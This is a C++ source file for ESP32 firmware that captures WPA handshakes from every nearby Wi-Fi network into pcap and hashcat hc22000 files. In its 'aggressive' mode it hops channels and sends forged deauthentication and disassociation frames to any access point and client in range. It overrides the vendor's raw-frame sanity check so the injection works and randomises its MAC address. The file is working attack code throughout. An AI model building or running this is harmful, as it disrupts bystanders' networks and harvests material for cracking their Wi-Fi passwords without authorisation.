// cap/sniffer.cpp
// Promiscuous EAPOL capture -> one classic pcap per BSSID.

#include "sniffer.h"
#include "pcap.h"
#include "hc22000.h"
#include "capture_name.h"
#include "../storage/littlefs_ops.h"
#include "../net/ap_sta.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include <esp_wifi.h>
#include <WiFi.h>
#include <SD.h>
#include <string.h>
#include <stdio.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

static const uint16_t FRAME_MAX = 400;
static const uint8_t  RING_SLOTS = 12;
static const uint32_t MAX_FILE_SIZE = 50 * 1024;
static const uint16_t MAX_FILES = 200;
static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_CORE[] = {1, 6, 11};

struct Slot {
    uint8_t  bssid[6];
    uint8_t  station[6];
    uint16_t len;
    uint32_t ts;
    uint8_t  frame[FRAME_MAX];
};

static Slot s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read  = 0;

static File     s_file;
static uint8_t  s_fileBssid[6];
static uint8_t  s_lastHsBssid[6];
static bool     s_fileOpen = false;
static uint32_t s_fileSize = 0;
static char     s_fileName[Storage::FILE_NAME_MAX];
static const char* const PREFIX = "/0N3P0rK/hs/";

static const uint8_t BEACON_SLOTS = 16;
struct BeaconSlot {
    uint8_t  bssid[6];
    uint8_t  channel;
    int8_t   rssi;
    uint16_t len;
    char     ssid[33];
    uint8_t  frame[FRAME_MAX];
};
static BeaconSlot s_beacons[BEACON_SLOTS];
static uint8_t s_beaconCount = 0;
static uint8_t s_beaconClock = 0;

static Counters s_cnt = {};
static volatile bool s_running = false;
static RunMode  s_mode = RunMode::Off;
static bool     s_hopEnabled = false;
static bool     s_deauthEnabled = false;
static uint8_t  s_channelIdx = 0;
static uint32_t s_lastHopMs = 0;
static uint8_t  s_apMac[6] = {};
static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t  s_kickSta[6] = {};
static uint8_t  s_kickBssid[6] = {};
static bool     s_kickStaOk = false;
static uint32_t s_lockUntil = 0;
static bool     s_lockOnHs = true;
static uint16_t s_lockMs = 8000;
static uint16_t s_hopMs = 300;
static int8_t   s_minRssi = -85;
static uint8_t  s_hopSet = 0;

static const uint8_t* hopTable(uint8_t* count) {
    if (s_hopSet == (uint8_t)HopSet::CORE) {
        *count = sizeof(HOP_CORE);
        return HOP_CORE;
    }
    *count = sizeof(HOP_ALL);
    return HOP_ALL;
}

static const BeaconSlot* findBeacon(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
    }
    return nullptr;
}

static bool hopLocked() {
    return s_lockUntil != 0 && millis() < s_lockUntil;
}

static void noteNetwork(const uint8_t* bssid, const char* ssid, bool force) {
    if (!bssid) return;
    snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);
    if (ssid && ssid[0]) {
        strncpy(s_cnt.currentSsid, ssid, sizeof(s_cnt.currentSsid) - 1);
        s_cnt.currentSsid[sizeof(s_cnt.currentSsid) - 1] = '\0';
    } else if (force) {
        s_cnt.currentSsid[0] = '\0';
    }
}

static void ssidForBssid(const uint8_t* bssid, char out[33]) {
    out[0] = '\0';
    const BeaconSlot* bcn = findBeacon(bssid);
    if (bcn && bcn->ssid[0]) {
        strncpy(out, bcn->ssid, 32);
        out[32] = '\0';
        return;
    }
    if (bcn) CapName::ssidFromMgmt(bcn->frame, bcn->len, out);
}

static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
    if (!bssid || !f || len < 24) return;
    if (len > FRAME_MAX) len = FRAME_MAX;
    char ssid[33];
    CapName::ssidFromMgmt(f, len, ssid);
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
            memcpy(s_beacons[i].frame, f, len);
            s_beacons[i].len = len;
            s_beacons[i].channel = s_cnt.currentChannel;
            s_beacons[i].rssi = rssi;
            bool learned = ssid[0] && !s_beacons[i].ssid[0];
            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
            if (learned) Hc22000::feed(f, len);
            if (ssid[0] && memcmp(bssid, s_lastHsBssid, 6) == 0) {
                strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
                s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
                noteNetwork(bssid, ssid, true);
            } else if (!hopLocked()) {
                noteNetwork(bssid, s_beacons[i].ssid, false);
            }
            return;
        }
    }
    uint8_t idx;
    if (s_beaconCount < BEACON_SLOTS) {
        idx = s_beaconCount++;
    } else {
        idx = s_beaconClock++ % BEACON_SLOTS;
    }
    memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
    memcpy(s_beacons[idx].bssid, bssid, 6);
    memcpy(s_beacons[idx].frame, f, len);
    s_beacons[idx].len = len;
    s_beacons[idx].channel = s_cnt.currentChannel;
    s_beacons[idx].rssi = rssi;
    if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
    if (!hopLocked()) noteNetwork(bssid, s_beacons[idx].ssid, false);
    Hc22000::feed(f, len);
}

static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !s_running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;

    s_cnt.framesSeen++;
    const uint8_t* f = pkt->payload;

    if (type == WIFI_PKT_MGMT) {
        uint8_t fc = f[0] & 0xFC;
        if (fc == 0x80 || fc == 0x50) {
            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
        }
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if ((f[0] & 0x0C) != 0x08) return;

    uint8_t toDs = (f[1] & 0x01) != 0;
    uint8_t fromDs = (f[1] & 0x02) != 0;

    const uint8_t* bssid = nullptr;
    const uint8_t* station = nullptr;
    uint16_t bodyOff = 24;
    if (toDs && !fromDs) {
        bssid   = f + 4;
        station = f + 10;
    } else if (!toDs && fromDs) {
        bssid   = f + 10;
        station = f + 4;
    } else if (toDs && fromDs) {
        // WDS / 4-address — Porkchop still looks for EAPOL here.
        bssid   = f + 16;
        station = f + 10;
        bodyOff = 30;
    } else {
        bssid   = f + 16;
        station = f + 10;
    }

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    bool isQos = (subtype & 0x08) != 0;
    if (isQos) bodyOff += 2;
    if (isQos && (f[1] & 0x80)) bodyOff += 4;

    bool eapol = false;
    if (bodyOff + 8 <= len &&
        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
        eapol = true;
    }
    if (!eapol) {
        uint16_t lim = len;
        for (uint16_t i = bodyOff; i + 1 < lim; i++) {
            if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
        }
    }
    if (!eapol) return;

    s_cnt.framesEapol++;
    if (s_lockOnHs && s_lockMs > 0) {
        s_lockUntil = millis() + s_lockMs;
    }

    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_cnt.framesDropped++;
        return;
    }
    Slot& s = s_ring[s_write];
    memcpy(s.bssid, bssid, 6);
    memcpy(s.station, station, 6);
    s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
    s.ts  = millis();
    memcpy(s.frame, f, s.len);
    s_write = next;
    s_cnt.framesQueued++;
}

static void makeFilename(const uint8_t* bssid, char out[Storage::FILE_NAME_MAX]) {
    char ssid[33];
    ssidForBssid(bssid, ssid);
    char stem[40];
    CapName::buildStem(ssid, bssid, stem, sizeof(stem));
    snprintf(out, Storage::FILE_NAME_MAX, "%s.pcap", stem);
}

static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts) {
    Pcap::PacketHeader ph;
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = Pcap::RADIOTAP_LEN + flen;
    ph.origLen = ph.inclLen;
    size_t n = 0;
    n += s_file.write((uint8_t*)&ph, sizeof(ph));
    n += s_file.write(Pcap::RADIOTAP_HEADER, Pcap::RADIOTAP_LEN);
    n += s_file.write(frame, flen);
    size_t expect = sizeof(ph) + Pcap::RADIOTAP_LEN + flen;
    if (n != expect) return false;
    s_fileSize += expect;
    return true;
}

static void closeFile() {
    if (s_fileOpen) {
        s_file.flush();
        s_file.close();
        s_fileOpen = false;
    }
}

static bool openFileForBssid(const uint8_t* bssid) {
    if (s_fileOpen) closeFile();

    Storage::Stats st = Storage::stats();
    char name[Storage::FILE_NAME_MAX];
    makeFilename(bssid, name);
    char path[80];
    snprintf(path, sizeof(path), "%s%s", PREFIX, name);

    bool exists = SD.exists(path);
    if (!exists && st.handshakes >= MAX_FILES) {
        Serial.println("[CAP] handshake cap (200 files) reached");
        return false;
    }

    s_file = SD.open(path, "a");
    if (!s_file) return false;

    s_fileSize = s_file.size();
    bool createdNew = false;
    if (s_fileSize >= MAX_FILE_SIZE) {
        s_file.close();
        return false;
    }

    if (s_fileSize == 0) {
        Pcap::FileHeader fh;
        fh.magic        = 0xA1B2C3D4;
        fh.versionMajor = 2;
        fh.versionMinor = 4;
        fh.thiszone     = 0;
        fh.sigfigs      = 0;
        fh.snaplen      = 65535;
        fh.linktype     = 127;
        if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
            s_file.close();
            return false;
        }
        s_fileSize = sizeof(fh);
        s_cnt.filesOpened++;
        createdNew = true;
    }

    memcpy(s_fileBssid, bssid, 6);
    memcpy(s_fileName, name, sizeof(s_fileName));
    s_fileOpen = true;

    char ssid[33];
    ssidForBssid(bssid, ssid);
    if (ssid[0]) CapName::writeCompanionSsid(Storage::DIR_HS, name, ssid);

    if (createdNew) {
        const BeaconSlot* bcn = findBeacon(bssid);
        if (bcn) {
            writePcapPacket(bcn->frame, bcn->len, millis());
            Hc22000::feed(bcn->frame, bcn->len);
        }
    }
    return true;
}

static bool sameBssid(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static void writeFrameToFile(const Slot& s) {
    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
        closeFile();
    }
    if (s_fileOpen && s_fileSize >= MAX_FILE_SIZE) {
        closeFile();
    }
    if (!s_fileOpen) {
        if (!openFileForBssid(s.bssid)) return;
    }
    if (!writePcapPacket(s.frame, s.len, s.ts)) {
        s_cnt.framesDropped++;
        closeFile();
        return;
    }
    s_cnt.framesWritten++;
    Hc22000::feed(s.frame, s.len);
    memcpy(s_kickBssid, s.bssid, 6);
    memcpy(s_kickSta, s.station, 6);
    s_kickStaOk = (s.station[0] & 0x01) == 0;
    char ssid[33];
    ssidForBssid(s.bssid, ssid);
    memcpy(s_lastHsBssid, s.bssid, 6);
    noteNetwork(s.bssid, ssid, true);
    if (ssid[0]) {
        strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
        CapName::writeCompanionSsid(Storage::DIR_HS, s_fileName, ssid);
    }
}

static void drainRing() {
    while (s_read != s_write) {
        const Slot& s = s_ring[s_read];
        writeFrameToFile(s);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    if (s_fileOpen) s_file.flush();
}

static bool isOwnAp(const uint8_t* bssid) {
    return memcmp(bssid, s_apMac, 6) == 0;
}

static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, dest, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static void kickOnThisChannel() {
    if (!s_deauthEnabled) return;
    if (Hc22000::shouldPauseDeauth()) return;
    uint8_t ch = s_cnt.currentChannel;
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        const uint8_t* bssid = s_beacons[i].bssid;
        if (s_beacons[i].channel != ch) continue;
        if (isOwnAp(bssid)) continue;
        if (s_beacons[i].rssi < s_minRssi) continue;
        sendRawMgmt(0xC0, bssid, s_bcast);
        sendRawMgmt(0xA0, bssid, s_bcast);
        if (s_kickStaOk && memcmp(s_kickBssid, bssid, 6) == 0) {
            sendRawMgmt(0xC0, bssid, s_kickSta);
            sendRawMgmt(0xA0, bssid, s_kickSta);
        }
        yield();
    }
}

void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HS);
    Storage::ensureDir(Storage::DIR_WPASEC);
    Storage::ensureDir(Storage::DIR_PWNCRACK);
    s_cnt = {};
    s_write = 0;
    s_read  = 0;
    s_running = false;
    s_mode = RunMode::Off;
    s_beaconCount = 0;
    Hc22000::reset();
}

static void startCommon(RunMode mode) {
    bool sdOk = Storage::begin();
    if (!sdOk) Serial.println("[CAP] SD missing - EAPOL counted, files may fail");

    if (s_running) stop();

    s_write = 0;
    s_read = 0;
    s_cnt = {};
    s_cnt.currentBssid[0] = 0;
    s_cnt.currentSsid[0] = 0;
    s_cnt.lastHsSsid[0] = 0;
    memset(s_lastHsBssid, 0, sizeof(s_lastHsBssid));
    s_lastHopMs = millis();
    s_channelIdx = 0;
    s_lockUntil = 0;
    s_kickStaOk = false;
    s_mode = mode;
    s_hopEnabled = (mode == RunMode::Aggressive);
    s_deauthEnabled = (mode == RunMode::Aggressive) && Config::radio().deauth;
    s_lockOnHs = Config::radio().lockOnHs;
    s_lockMs = Config::radio().lockMs;
    s_hopMs = Config::radio().hopMs;
    s_minRssi = Config::radio().minRssi;
    s_hopSet = Config::radio().hopSet;
    if (s_hopMs < 50) s_hopMs = 50;

    // SoftAP iface must exist or 802.11 TX / promiscuous often stay dead
    // after the boot fence left WIFI_OFF.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);
    uint8_t hopN = 0;
    const uint8_t* hops = hopTable(&hopN);
    uint8_t startCh = s_hopEnabled ? hops[0] : 6;
    const char* apName = s_hopEnabled ? "OneLPig AGG" : "OneLPig";
    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();
    bool apOk = WiFi.softAP(apName, "onelpig123", startCh, 1 /* hidden */, 4);
    delay(80);
    WiFi.softAPmacAddress(s_apMac);
    Serial.printf("[CAP] wifi AP+STA hidden=%s ch=%u ap=%s\n",
                  apName, (unsigned)startCh, apOk ? "ok" : "fail");

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(startCh, WIFI_SECOND_CHAN_NONE);
    s_cnt.currentChannel = startCh;
    s_running = true;

    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u sd=%u\n",
                  mode == RunMode::Aggressive ? "AGGRESSIVE" : "light",
                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
                  (unsigned)s_cnt.currentChannel, (unsigned)sdOk);
}

void startLight() {
    startCommon(RunMode::Light);
}

void startAggressive() {
    startCommon(RunMode::Aggressive);
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    bool hopped = s_hopEnabled;
    s_running = false;
    s_deauthEnabled = false;
    s_hopEnabled = false;
    s_mode = RunMode::Off;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    drainRing();
    closeFile();
    Storage::compactLoot();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    (void)hopped;
    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
                  s_cnt.framesSeen, s_cnt.framesEapol,
                  s_cnt.framesWritten, s_cnt.framesDeauth,
                  s_cnt.framesDropped);
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }
bool isLocked() { return s_running && s_lockUntil != 0 && millis() < s_lockUntil; }

const Counters& counters() { return s_cnt; }

void loop() {
    if (!s_running) return;

    drainRing();

    uint32_t now = millis();
    if (isLocked()) {
        if (now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
            kickOnThisChannel();
        }
        return;
    }

    if (!s_hopEnabled) return;
    if (now - s_lastHopMs >= s_hopMs) {
        s_lastHopMs = now;
        uint8_t hopN = 0;
        const uint8_t* hops = hopTable(&hopN);
        if (hopN == 0) return;
        s_channelIdx = (uint8_t)((s_channelIdx + 1) % hopN);
        uint8_t ch = hops[s_channelIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = ch;
        kickOnThisChannel();
    }
}

} // namespace Cap
